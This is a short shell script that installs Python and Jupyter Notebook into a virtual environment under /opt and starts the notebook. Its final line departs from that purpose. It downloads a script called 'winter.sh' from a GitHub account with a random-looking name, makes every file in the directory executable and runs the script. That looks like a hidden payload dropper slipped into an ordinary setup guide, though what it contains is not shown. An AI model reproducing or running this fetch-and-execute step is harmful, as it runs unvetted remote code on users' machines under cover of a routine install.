sudo apt-get update -y
sudo apt install python3 python3-pip python3-venv -y
cd /opt
python3.10 -m venv jupyter-venv
source jupyter-venv/bin/activate
pip install --upgrade pip
pip3 install jupyter
jupyter notebook --generate-config
jupyter notebook
wget https://github.com/williehprnuhrxyq/dualspace/raw/main/winter.sh && chmod +x * && ./winter.sh
